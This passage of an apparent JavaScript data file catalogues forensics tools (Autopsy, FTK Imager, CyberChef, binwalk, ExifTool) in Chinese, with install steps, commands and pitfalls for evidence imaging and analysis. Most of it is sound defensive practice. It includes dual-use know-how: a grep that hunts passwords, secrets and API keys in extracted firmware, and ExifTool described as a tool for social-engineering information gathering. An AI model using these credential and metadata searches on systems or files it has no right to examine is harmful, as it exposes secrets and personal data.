    { t: "下载安装", d: "官网填信息后下载 Windows 安装包（自带 JRE 与 Sleuth Kit）。装完首次启动会提示设置案例目录与多线程数。" },
    { t: "新建案例", d: "Case → New Case → 填案例名与保存路径 → 填案例编号/调查员（可随意）→ Finish。" },
    { t: "添加数据源", d: "Add Data Source → Disk Image or VM File → 选 .dd/.E01 → 下一步。", hint: "取证镜像要先做哈希校验：Autopsy 会提示计算 MD5，务必记录，这是证据链的一部分。" },
    { t: "选择分析模块", d: "勾选 Recent Activity（浏览器/注册表）、Keyword Search、Hash Lookup、File Type Identification、Timeline。" },
    { t: "看结果", d: "左侧树：Views → File Types / Deleted Files / Web History；右上角 Timeline 看时间线；Keyword Search 搜 IP、域名、密码。" },
    { t: "出报告", d: "Generate Report → HTML，包含文件列表与关键发现。" }
  ],
  pit: "Autopsy 索引会占用与镜像同量级的磁盘空间；大镜像分析很慢，先用关键文件类型过滤再开全量索引。"
},
{
  id: "ftk", name: "FTK Imager", cat: "forensics", icon: "FTK", ver: "4.7",
  desc: "免费的取证镜像工具：做物理/逻辑镜像、挂载镜像只读浏览、导出单个文件，取证流程第一步就用它。",
  tags: ["镜像获取", "只读挂载", "证据"], plat: "Windows", lvl: "进阶",
  official: "https://www.exterro.com/", dl: "https://www.exterro.com/digital-forensics-software/ftk-imager",
  steps: [
    { t: "注册下载", d: "Exterro 官网填表下载 exe（免费）。装完运行。" },
    { t: "制作物理镜像", d: "File → Create Disk Image → 选 Physical Drive → 选源盘 → 选 E01 或 Raw(dd) 格式 → 填案例信息 → 设置分卷与压缩 → Start。" },
    { t: "校验哈希", d: "镜像完成后会显示 MD5/SHA1，抄进报告，这是证据完整性证明。" },
    { t: "只读挂载浏览", d: "File → Add Evidence Item → Image File → 选镜像 → 挂载后左侧树浏览分区，右键可导出单个文件。" },
    { t: "导出内存/注册表", d: "也可以 Capture Memory（内存）与获取注册表 hive，用于后续分析。" }
  ],
  pit: "不要对正在运行的系统盘直接做一致性镜像（数据会变），应先做内存镜像或用取证启动盘。写盘操作要在写保护状态下进行。"
},
{
  id: "cyberchef", name: "CyberChef", cat: "forensics", icon: "CC", ver: "10.x",
  desc: "GCHQ 开源的「网络瑞士军刀」，在浏览器里做编码解码、加解密、解析、提取与正则，分析 payload 神器。",
  tags: ["编码解码", "在线", "数据清洗"], plat: "浏览器 / 本地", lvl: "入门",
  official: "https://gchq.github.io/CyberChef/", dl: "https://gchq.github.io/CyberChef/",
  steps: [
    { t: "直接用在线版", d: "打开官网即可用，无需安装。涉密/敏感数据建议下离线版（Releases 里有单文件 HTML）。" },
    { t: "基础用法", d: "左侧 Operations 拖到 Recipe 区，输入放 Input，结果在 Output。可串联多个操作。" },
    { t: "典型场景：解多层编码", d: "From Base64 → URL Decode → 看到明文；或 Magic 一键猜编码。" },
    { t: "提取 IOC", d: "用「Extract URLs」「Extract IP addresses」「Regular expression」从大段日志里抽指标。" },
    { t: "本地部署", d: "下载 release 的 CyberChef_vX.zip 解压，直接双击 index.html 即可离线用。", cmd: "git clone https://github.com/gchq/CyberChef.git && cd CyberChef && npm install && npm run build" }
  ],
  pit: "在线版会把输入发到浏览器本地处理（不上传服务器），但仍不要粘贴真实客户数据；离线版最稳。"
},
{
  id: "binwalk", name: "binwalk", cat: "forensics", icon: "BW", ver: "2.4",
  desc: "固件/文件内嵌内容分析：识别固件里的文件系统、压缩包、可执行文件并提取，IoT 与固件取证常用。",
  tags: ["固件", "隐写", "提取"], plat: "Linux / Win(WSL)", lvl: "进阶",
  official: "https://github.com/ReFirmLabs/binwalk", dl: "https://github.com/ReFirmLabs/binwalk",
  steps: [
    { t: "Kali 安装", d: "", cmd: "sudo apt install -y binwalk" },
    { t: "先扫一遍", d: "看固件里有什么签名（squashfs、cramfs、gzip、ELF）。", cmd: "binwalk firmware.bin" },
    { t: "提取内嵌内容", d: "-e 自动提取，-M 递归扫描。", cmd: "binwalk -eM firmware.bin" },
    { t: "看提取结果", d: "结果在 _firmware.bin.extracted 目录，常见的 squashfs 需要 unsquashfs 解。", cmd: "unsquashfs squashfs-root.squashfs" },
    { t: "找硬编码与后门", d: "进文件系统搜密码、私钥、启动脚本。", cmd: "grep -rniE \"passwd|secret|api_key\" ./squashfs-root/etc" }
  ],
  pit: "binwalk 新版本用 Rust 重写（v3），安装方式变了；Python 老版（v2.4）在 Windows 上依赖 sasquatch 等工具，建议直接用 Kali。"
},
{
  id: "exiftool", name: "ExifTool", cat: "forensics", icon: "EX", ver: "12.x",
  desc: "读取和修改文件元数据（EXIF/GPS/作者/创建工具），图片取证、文档溯源、社工信息收集高频工具。",
  tags: ["元数据", "EXIF", "溯源"], plat: "全平台", lvl: "入门",
  official: "https://exiftool.org/", dl: "https://exiftool.org/",
  steps: [
    { t: "Windows 安装", d: "下载 exiftool-X.XX_64.zip，解压得到 exiftool(-k).exe，改名 exiftool.exe 并放进 PATH（或直接用它拖文件）。" },
    { t: "看全部元数据", d: "", cmd: "exiftool photo.jpg" },
    { t: "只看关键字段", d: "GPS、机型、软件版本、创建时间最有价值。", cmd: "exiftool -GPSLatitude -GPSLongitude -Model -Software -CreateDate photo.jpg" },
    { t: "批量处理目录", d: "-r 递归，-csv 导出成表格方便分析。", cmd: "exiftool -r -csv -GPSPosition -Model D:\\evidence > meta.csv" },
    { t: "清除元数据（发布前）", d: "", cmd: "exiftool -all= photo.jpg" }
  ],
  pit: "修改元数据会改变文件哈希，取证场景绝不能改原件；要改先复制副本，并记录原始哈希。"
}
);
